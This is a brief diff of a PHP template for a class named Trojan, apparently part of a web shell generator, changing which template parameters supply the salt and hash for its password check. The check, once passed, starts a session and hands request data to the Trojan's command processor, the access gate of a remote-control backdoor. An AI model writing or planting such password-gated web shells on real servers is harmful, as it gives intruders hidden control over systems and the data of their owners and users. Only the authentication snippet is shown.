@@ -193,7 +193,7 @@ class Trojan{
 /* ---------- Procedural code starts here ---------- */
 
 # only process the command if a valid password has been specified
-if(sha1($_REQUEST['args']['password'] . '<%= locks[:one][:salt] %>') == '<%= locks[:one][:hash] %>'){ 
+if(sha1($_REQUEST['args']['password'] . '<%= params[:salt] %>') == '<%= params[:hash] %>'){ 
     session_start();
     $trojan = new Trojan();
     $trojan->process_command($_REQUEST);
